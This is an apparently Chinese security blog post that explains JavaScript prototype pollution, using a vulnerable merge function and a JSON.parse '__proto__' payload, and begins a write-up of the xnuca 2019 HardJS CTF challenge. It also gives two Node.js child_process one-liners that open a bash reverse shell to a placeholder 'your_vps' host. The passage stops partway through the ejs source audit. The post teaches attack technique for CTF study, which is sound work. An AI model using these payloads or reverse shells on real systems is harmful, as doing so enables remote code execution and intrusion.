<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="JavaScript-prototype-pollution"><meta name="keywords" content="JavaScript-prototype-pollution"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>JavaScript原型链污染初探 | Somnus's blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JS中的原型和原型链"><span class="toc-number">1.</span> <span class="toc-text">JS中的原型和原型链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原型"><span class="toc-number">1.1.</span> <span class="toc-text">原型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原型链"><span class="toc-number">1.2.</span> <span class="toc-text">原型链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JS原型链污染"><span class="toc-number">2.</span> <span class="toc-text">JS原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原型链污染触发示例"><span class="toc-number">3.</span> <span class="toc-text">原型链污染触发示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nodejs命令执行"><span class="toc-number">4.</span> <span class="toc-text">Nodejs命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xnuca-2019-HardJS"><span class="toc-number">5.</span> <span class="toc-text">xnuca 2019 HardJS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#框架分析"><span class="toc-number">5.1.</span> <span class="toc-text">框架分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后端RCE"><span class="toc-number">5.2.</span> <span class="toc-text">后端RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#前端XSS"><span class="toc-number">5.3.</span> <span class="toc-text">前端XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Breaking-2018-Thejs"><span class="toc-number">6.</span> <span class="toc-text">Code-Breaking 2018 Thejs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">86</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">16</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">26</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io" target="_blank" rel="noopener">osword</a><a class="author-info-links__name text-center" href="http://dkk.ink" target="_blank" rel="noopener">dkk</a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">JavaScript原型链污染初探</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-30</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/JavaScript-prototype-pollution/">JavaScript-prototype-pollution</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>简单学习一波JS原型链污染，并从两道CTF题目来深入理解攻击原理<a id="more"></a></p>
<h2 id="JS中的原型和原型链"><a href="#JS中的原型和原型链" class="headerlink" title="JS中的原型和原型链"></a>JS中的原型和原型链</h2><h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Foo</strong>函数的内容，就是<strong>Foo</strong>类的<strong>构造函数</strong>，<code>this.name</code>和<code>this.age</code>就是<strong>Foo</strong>类的一个属性</p>
<p>一个类中必然有一个方法，类似属性，我们可以将方法定义在构造函数内部：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">    <span class="keyword">this</span>.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">(<span class="keyword">new</span> Foo()).show();</span><br></pre></td></tr></table></figure>

<p>但这样写的话，我们每次构造一个<strong>Foo</strong>对象时都会执行一次<code>this.show = function()</code>，这个<code>show</code>方法实际上是绑定在<strong>对象</strong>上的，而不是绑定在<strong>类</strong>中</p>
<p>我希望在创建类<strong>Foo</strong>只创建一次<code>show</code>方法，这时候就需要使用原型<code>prototype</code>了：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> Foo();</span><br><span class="line">foo.show();</span><br></pre></td></tr></table></figure>

<p>我们可以认为原型<code>prototype</code>是类<strong>Foo</strong>的一个属性，而所有用<strong>Foo</strong>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上述代码的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法</p>
<p>我们可以通过<code>Foo.prototype</code>来访问<strong>Foo</strong>类的<strong>原型</strong>，但<strong>Foo</strong>实例化出来的对象，是不能通过<code>prototype</code>访问<strong>原型</strong>的。这时候，就需要<code>__proto__</code></p>
<p>一个<strong>Foo</strong>类实例化出的<strong>foo</strong>对象，可以通过<code>foo.__proto__</code>来访问<code>Foo</code>类的原型，也就是说：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__ == Foo.prototype</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/js-prototype-pollution/3.png" alt=""></p>
<p>下面看一段示例代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Foo这个构造函数具有一个prototype属性，这个属性是一个对象，并且可以自由扩展属性</span></span><br><span class="line">Foo.prototype = &#123;</span><br><span class="line">    showName:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"I'm "</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    &#125;,</span><br><span class="line">    showAge:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"And I'm "</span> + <span class="keyword">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = <span class="keyword">new</span> Foo(<span class="string">'admin'</span>,<span class="number">18</span>);</span><br><span class="line"><span class="comment">//当试图访问对象一个不存在的属性时，会从它的构造函数的prototype对象属性中去找</span></span><br><span class="line">fn.showName(); </span><br><span class="line">fn.showAge();</span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype);</span><br><span class="line"><span class="built_in">console</span>.log(fn);</span><br><span class="line"><span class="built_in">console</span>.log(fn.__proto__); <span class="comment">//对象的__proto__属性指向构造函数的prototype属性</span></span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ node foo.js</span><br><span class="line">I<span class="string">'m admin</span></span><br><span class="line"><span class="string">And I'</span>m 18</span><br><span class="line">&#123; showName: [Function: showName], showAge: [Function: showAge] &#125;</span><br><span class="line">&#123; name: <span class="string">'admin'</span>, age: 18 &#125;</span><br><span class="line">&#123; showName: [Function: showName], showAge: [Function: showAge] &#125;</span><br></pre></td></tr></table></figure>

<h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JS中的继承机制。</p>
<p>示例代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Base</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">"base"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">"sub"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Base.prototype.baseFunc = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.objFunc = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Hello object"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">util.inherits(Sub,Base);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> objBase = <span class="keyword">new</span> Base();</span><br><span class="line">objBase.baseFunc();</span><br><span class="line">objBase.objFunc();</span><br><span class="line"><span class="built_in">console</span>.log(objBase);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> objSub = <span class="keyword">new</span> Sub();</span><br><span class="line">objSub.baseFunc();</span><br><span class="line"><span class="built_in">console</span>.log(objSub);</span><br><span class="line"><span class="built_in">console</span>.log(objSub.__proto__.__proto__.__proto__);</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ node class.js </span><br><span class="line">base</span><br><span class="line">Hello object</span><br><span class="line">Base &#123; name: <span class="string">'base'</span> &#125;</span><br><span class="line">sub</span><br><span class="line">Sub &#123; name: <span class="string">'sub'</span> &#125;</span><br><span class="line">&#123; objFunc: [Function] &#125;</span><br></pre></td></tr></table></figure>

<p>用一张图表示这些类之间的关系</p>
<p><img src="../../../../img/js-prototype-pollution/2.png" alt=""></p>
<p>因为对象的<code>__proto__</code>属性指向构造函数的<code>prototype</code>属性，并且当访问对象不存在的属性时，会从它的构造函数的<code>prototype</code>去寻找</p>
<p>首先，<code>objSub.__proto__ == Sub.prototype</code>，如果我们尝试访问<code>objSub.objFunc()</code>，由于<strong>Sub</strong>类不存在该方法，于是从<code>Sub.prototype</code>寻找，<code>Sub.prototype</code>也没有该方法。由于<code>util.inherits(Sub,Base)</code>，<strong>Sub</strong>继承了<strong>Base</strong>，于是从<code>Base.prototype</code>寻找，也没有。最后找到了<code>Object.prototype</code>有该方法。该过程就形成了一条JS原型链。</p>
<h2 id="JS原型链污染"><a href="#JS原型链污染" class="headerlink" title="JS原型链污染"></a>JS原型链污染</h2><p>通过前面的初步了解，我们已经知道<code>foo.__proto__  =&gt; Foo.prototype</code>，那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就能修改<strong>Foo</strong>类呢</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/js-prototype-pollution/4.png" alt=""></p>
<p>我们通过修改了<code>foo</code>的原型<code>foo.__proto__.bar = 2</code>，而<code>foo</code>是一个<code>Object</code>类的实例，所以实际上是修改了<code>Object</code>这个类，给这个类增加了一个属性<strong>bar</strong>，值为2</p>
<p>而我们后面又用<code>Object</code>类创建了一个<code>zoo</code>对象<code>{}</code>，虽然创建时为空，但是因为对象有类<code>Object</code>中的所有属性和方法，所以自然有<code>bar = 2</code>这个属性了</p>
<p>再看如下示例代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="built_in">console</span>.log(foo.bar);</span><br><span class="line">foo.__proto__.bar = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(foo.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(foo);</span><br><span class="line"><span class="keyword">var</span> zoo = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar);</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ node test.js </span><br><span class="line">undefined</span><br><span class="line">Foo &#123; bar: 2 &#125;</span><br><span class="line">Foo &#123;&#125;</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>可以<strong>Foo</strong>类中本来没有<strong>bar</strong>这个属性，而我们通过修改<code>foo.__proto__</code>即<strong>Foo</strong>得原型来使<strong>Foo</strong>类多了一个<strong>bar</strong>属性，值为2</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个<strong>对象</strong>的<strong>原型</strong>，那么可以影响所有和这个对象来自同一个类、父祖类，这个攻击方式就是<strong>原型链污染</strong></p>
<h2 id="原型链污染触发示例"><a href="#原型链污染触发示例" class="headerlink" title="原型链污染触发示例"></a>原型链污染触发示例</h2><p>最常见的就是通过数组<strong>键名</strong>来赋值的情况，例如如下的<strong>merge</strong>函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在合并的过程中，存在<code>target[key] = source[key]</code>进行<strong>键值</strong>赋值的情况，这里的<code>key</code>如果是<code>__proto__</code>，那么就可能存在原型链污染的情况，用如下代码测试：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="string">"__proto__"</span>:&#123;<span class="attr">b</span>:<span class="number">2</span>&#125;&#125;;</span><br><span class="line">merge(o1,o2);</span><br><span class="line"><span class="built_in">console</span>.log(o1.a,o1.b);</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b);</span><br></pre></td></tr></table></figure>

<p>运行得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ node test.js </span><br><span class="line">1 2</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>

<p>可以看到<code>o1.a=1</code>，<code>o1.b=2</code>，说明已经成功合并<code>o1</code>和<code>o2</code>，但是<code>o3.b = null</code>，并没有造成原型链污染。原因是我们在定义<code>o2 = {a:1,&quot;__proto__&quot;:{b:2}}</code>时，就已经给<code>o2.__proto__</code>即<code>o2</code>的原型赋值<code>{b:2}</code>了，所以后面数组的键名传入的就是<code>a</code>和<code>b</code>。只是单纯的将<code>o2</code>的键复制给<code>o1</code>，并没有对原型链进行污染</p>
<p>所以，需要把<code>__proto</code>被当作是键名，使用<code>JSON.parse</code>进行JSON解析：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a":1,"__proto__":&#123;"b":2&#125;&#125;'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/js-prototype-pollution/5.png" alt=""></p>
<p>成功污染原型链，这是因为JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。 </p>
<h2 id="Nodejs命令执行"><a href="#Nodejs命令执行" class="headerlink" title="Nodejs命令执行"></a>Nodejs命令执行</h2><p>既然我们要污染原型链，最终的目的肯定是RCE，那就离不开命令执行，常见的命令执行就是调用<code>child_process</code>模块来执行系统命令：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global.process.mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/your_vps/8888 0&gt;&amp;1"'</span>)</span><br><span class="line">global.process.mainModule.constructor._load(<span class="string">'child_process'</span>).exec(<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/your_vps/8888 0&gt;&amp;1"'</span>)</span><br></pre></td></tr></table></figure>

<p>这两条常见的代码执行后都可以将shell反弹到我们的vps上</p>
<h2 id="xnuca-2019-HardJS"><a href="#xnuca-2019-HardJS" class="headerlink" title="xnuca 2019 HardJS"></a>xnuca 2019 HardJS</h2><p>源码：<a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs" target="_blank" rel="noopener">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a> </p>
<h3 id="框架分析"><a href="#框架分析" class="headerlink" title="框架分析"></a>框架分析</h3><p>首先，这是一个nodejs的网站。</p>
<p>根目录有两个显眼的<strong>server.js</strong>，<strong>robots.py</strong></p>
<p><strong>robots.py</strong>中告诉我们，flag为环境<strong>变量</strong>，并作为<strong>admin</strong>用户的密码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">"admin"</span></span><br><span class="line">password = os.getenv(<span class="string">"FLAG"</span>)</span><br></pre></td></tr></table></figure>

<p>从<strong>package.json</strong>中可以看到，程序的入口点在<strong>server.js</strong>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">"main"</span>: <span class="string">"server.js"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么，就从该文件开始审计起，看开头就知道，使用了<strong>express</strong>框架，模板渲染引擎使用了<strong>ejs</strong></p>
<p>然后就是各个功能的路由：</p>
<ul>
<li><code>/</code> 首页</li>
<li><code>/static</code> 静态文件</li>
<li><code>/sandbox</code> 显示用户HTML数据用的沙盒</li>
<li><code>/login</code> 登陆</li>
<li><code>/register</code> 注册</li>
<li><code>/get</code> json接口 获取数据库中保存的数据</li>
<li><code>/add</code> 用户添加数据的接口</li>
</ul>
<p>除了<code>/static</code>，<code>/login</code>，<code>/register</code>以外，每个路由在访问时都会经过<code>auth</code>函数进行身份验证：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// var session = req.session;</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.login || !req.session.userid )&#123;</span><br><span class="line">        res.redirect(<span class="number">302</span>,<span class="string">"/login"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外开头还有一句代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br></pre></td></tr></table></figure>

<p>说明我们可以<code>json</code>格式传输参数到服务器端，修改<code>Content-Type:application/json</code></p>
<h3 id="后端RCE"><a href="#后端RCE" class="headerlink" title="后端RCE"></a>后端RCE</h3><p>通过前面的简单分析，我们知道该项目使用了<strong>ejs</strong>作为模板引擎，由于该模板引擎中通常由<strong>eval</strong>等操作用于解析，因此我们去审计源码<strong>ejs.js</strong>中可能进行原型链污染的地方</p>
<p>在构造函数<strong>Template</strong>中，存在非常多我们可能可以利用的变量：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Template</span>(<span class="params">text, opts</span>) </span>&#123;</span><br><span class="line">  opts = opts || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> options = &#123;&#125;;</span><br><span class="line">  <span class="keyword">this</span>.templateText = text;</span><br><span class="line">  <span class="keyword">this</span>.mode = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>.truncate = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">this</span>.currentLine = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">this</span>.source = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">this</span>.dependencies = [];</span><br><span class="line">  options.client = opts.client || <span class="literal">false</span>;</span><br><span class="line">  options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;</span><br><span class="line">  options.compileDebug = opts.compileDebug !== <span class="literal">false</span>;</span><br><span class="line">  options.debug = !!opts.debug;</span><br><span class="line">  options.filename = opts.filename;</span><br><span class="line">  options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;</span><br><span class="line">  options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter 